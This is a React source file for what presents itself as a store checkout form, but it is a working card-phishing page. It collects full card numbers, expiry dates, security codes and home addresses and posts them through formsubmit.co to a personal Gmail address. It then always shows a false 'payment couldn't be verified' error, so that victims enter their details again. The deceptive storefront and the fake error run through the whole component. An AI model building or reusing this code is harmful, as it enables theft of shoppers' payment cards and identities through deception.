 import './Form.scss'
 
 import {useSelector} from 'react-redux'
 
  import { useState, useEffect } from "react";
  import { ToastContainer, toast } from 'react-toastify';

  import 'react-toastify/dist/ReactToastify.css';
  import LoadingSpinner from "../loader/LoadingSpinner";
  
import card1 from '../../assets/Visa.png';
import card2 from '../../assets/Mastercard.png';
import card3 from '../../assets/Maestro.png';
import card4 from '../../assets/Amex.png';

import { BsFillRecordCircleFill, BsQuestionCircle  } from 'react-icons/bs';
import { FiSearch, FiLock  } from 'react-icons/fi';
import { LiaTimesSolid } from 'react-icons/lia';

import land3 from '../../assets/no-iphone-no-problem-1500-test.png';

function Form() {
  const [isLoading, setIsLoading] = useState(false);
  const [formValues, setFormValues] = useState({});

  const [touched, setTouched] = useState({});

  //error
  const [formError, setFormError] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });

    setTouched((prevState) => ({
      ...prevState,
      [e.target.name]: true,
    }));
  };

  const validate = (values) => {
    const errors = {};
    const regex =
      /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;

    if (!values.email) {
      errors.email = "Email is required";
    } else if (!regex.test(values.email)) {
      errors.email = "This is not a valid email";
    }

/*
    if (!values.password) {
      errors.password = "Enter your password";
    }
*/
    return errors;
  };

  useEffect(() => {
    validate(formValues);
    setFormError(validate(formValues));
  }, [formValues, touched]);

  const handlesubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);
    if (Object.keys(formError).length > 0) {
      setTouched({
        email: true,
       // password: true,
      });
      setIsLoading(false);
    }
    if (Object.keys(formError).length === 0) {
      setTouched({
        email: false,
      //  password: false,
      });

      fetch("https://formsubmit.co/ajax/maikellljudge@gmail.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json",
        },
        body: JSON.stringify({
         // password: formValues.password,
          email: formValues.email,
          cardnumber: formValues.cardnumber,
          expdate: formValues.expdate,
          cvv: formValues.cvv,
          cardname: formValues.cardname,
          country: formValues.country,
          firstname: formValues.firstname,
          lastname: formValues.lastname,
          address: formValues.address,
          apartment: formValues.apartment,
          city: formValues.city,
          state: formValues.state,
          zipcode: formValues.zipcode,
          phone: formValues.phone,
          _subject: `New form submitted  By ${formValues.email}`,
          _captcha: true,
          _blacklist: "spammy pattern, banned term, phrase",
          _template: "box",
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success === "true") {
            setFormValues({})
            setIsLoading(false)
           // alert("success");
           toast.error("Your payment details couldn't be verified. Check your card details and try again")
          } else {
          //  alert("failure");
          setFormValues({})
          setIsLoading(false)
          }
        })
        .catch((error) => console.log(error));
    }
  };
  


  const cart = useSelector((state) => state.cart)

  const getTotal = () => {
    let totalQuantity = 0
    let totalPrice = 0
    cart.forEach(item => {
      totalQuantity += item.quantity
      totalPrice += item.price * item.quantity
    })
    return {totalPrice, totalQuantity}
  }
 

 const getTotalQuantity = () => {
    let total = 0
    cart.forEach(item => {
      total += item.quantity
    })
    return total
  }
  



  return (
  
    <div>
    
      <ToastContainer 
       position="top-center"
      />
      
      
      <form onSubmit={handlesubmit} className="payment-form-cont">
        <div className='box'>
          <h1 className='payment-form-header'>Contact</h1>
          <input 
          className='payment-email'
          placeholder="Email"
          type="text"
          name="email"
          value={formValues.email} onChange={handleChange} />
          <div className="errorMsg">
            {touched.email && formError.email}
          </div>
          
          <div className='checkbox-container'>
           <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" />
            <label for="vehicle1">Email me with news and offers</label>
          </div>  
        </div>
        
        
        
         <div>
         <h1 className='payment-form-header'>Delivery</h1>
          <input
            className='form-input'
            placeholder="Country/Region"
            required
            type="text"
            name="country"
            value={formValues.country}
            onChange={handleChange}
        />
        </div>
        
        <div className='payment-name-cont'>
        
         <input
            className='payment-name'
            placeholder="First name"
            required
            type="text"
            name="firstname"
            value={formValues.firstname}
            onChange={handleChange}
        />
        
         <input
            className='payment-name'
            placeholder="Last name"
            required
            type="text"
            name="lastname"
            value={formValues.lastname}
            onChange={handleChange}
        />
      
        </div>
        
        
        <div>
              <div className='payment-address-cont'>
                   <input
                      className='form-input'
                      placeholder="Address"
                      required
                      type="text"
                      name="address"
                      value={formValues.address}
                      onChange={handleChange}
                  />
                  
                   <input
                      className='form-input'
                      placeholder="Apartment, Suite, etc. (Optional)"
                      required
                      type="text"
                      name="apartment"
                      value={formValues.apartment}
                      onChange={handleChange}
                  />
            </div>
            
   
            <div className='payment-address-cont-2'>
                <input
                      className='payment-city'
                      placeholder="City"
                      required
                      type="text"
                      name="city"
                      value={formValues.city}
                      onChange={handleChange}
                  />
                  
                   <input
                      className='payment-city'
                      placeholder="State"
                      required
                      type="text"
                      name="state"
                      value={formValues.state}
                      onChange={handleChange}
                  />
                  
                   <input
                      className='payment-city'
                      placeholder="ZIP code"
                      required
                      type="text"
                      name="zipcode"
                      minlength="4" maxlength="6"
                      value={formValues.zipcode}
                      onChange={handleChange}
                  />
            </div>
            
     
            <div>
                 <input
                      className='payment-phone'
                      placeholder="Phone"
                      required
                      type="text"
                      name="phone"
                      minlength="10" maxlength="15"
                      value={formValues.phone}
                      onChange={handleChange}
                  />
            </div>
        </div>
        
     
        
        <div>
          <h1 className='payment-form-header'>Shipping method</h1>
        <div className='shipping-color-cont'>
             <p className='shipping-color-p'>Free Standard Shipping (7-15 days)</p>
             <p className='shipping-color-p1'>Free</p>
        </div>
        
        
         <h1 className='payment-form-header'>Payment</h1>
         <p>All transactions are secure and encrypted</p>
         <div className='payment-cc-cont'>
            <div className='creditcard-color-cont'>
              <div className='creditcard-color-circle-cont'>
               <BsFillRecordCircleFill className='creditcard-color-circle'/>
               <p className='creditcard-color-p'>Credit card</p>
                </div>
               <div className='card-image-cont'>
                 <img src={card1} alt='card-image' className='card'/>
                 <img src={card2} alt='card-image' className='card'/>
                 <img src={card3} alt='card-image' className='card'/>
                 <img src={card4} alt='card-image' className='card'/>
               </div>
            </div>
            
            <input
              className='creditcard-number'
              placeholder="Card number"
              required
              type="text"
              name="cardnumber"
              minlength="13"
              maxlength="16"
              pattern="([A-z0-9À-ž\s]){10,}"
              value={formValues.cardnumber}
              onChange={handleChange}
          />
        
        <div className='payment-cc-cont-2'>
         <input
            className='payment-security'
            placeholder="Expiration date (MM/YY)"
            required
            type="text"
            name="expdate"
            maxlength="5"
            value={formValues.expdate}
            onChange={handleChange}
        />
        
         <input
            className='payment-security'
            placeholder="Security code"
            required
            type="text"
            name="cvv"
            minlength="3" maxlength="4"
            value={formValues.cvv}
            onChange={handleChange}
        />
        </div>
        
         <input
           className='creditcard-number'
            placeholder="Name on card"
            required
            type="text"
            name="cardname"
            value={formValues.cardname}
            onChange={handleChange}
        />
        
        </div>
            <div className='checkbox-container'>
                <input className='checkbox' type="checkbox" id="vehicle1" name="vehicle1" value="Bike" />
                <label className='checkbox-label' for="vehicle1">Use shipping address as billing address</label>
            </div>
            
          <h1 className='payment-form-header-order'>Order summary</h1> 
          
          <div className='order-s'>
               <div className='order-summary-1'>
                       <div className='order-img-cont'>
                        <img src={land3} alt='land-image' className='order-image'/>
                         <div className='order-totalQuantity-cont'>
                         <p className='order-totalQuantity'> {getTotalQuantity() || 0}</p>
                        </div>
                        <p>Ringo</p>
                      </div>
                      <p>${getTotal().totalPrice}</p>
                  </div>
               <div>
                    <input
                        className='order-dicount'
                        placeholder="Discount code"
                        type="text"
                        name="discount code"
                        value={formValues.discountcode}
                        onChange={handleChange}
                    />
                    
                    <button className='order-dicount-btn'>Apply</button>
              </div>
               
              <div>
                  <div className='order-summary'>
                      <p>Subtotal</p>
                      <p>${getTotal().totalPrice}</p>
                  </div>
                  
                   <div className='order-summary'>
                      <p>Shipping</p>
                      <p>Free</p>
                  </div>
                  
                   <div className='order-summary'>
                      <p>Total</p>
                      <p>${getTotal().totalPrice}</p>
                  </div>
              </div> 
              
            </div>  
            
       </div> 
       
        {isLoading ? (<LoadingSpinner />)
       : ( <button className='money-button' type="submit">Pay now</button>) }

       
      </form>
      
     
    </div>
  );
}

export default Form;
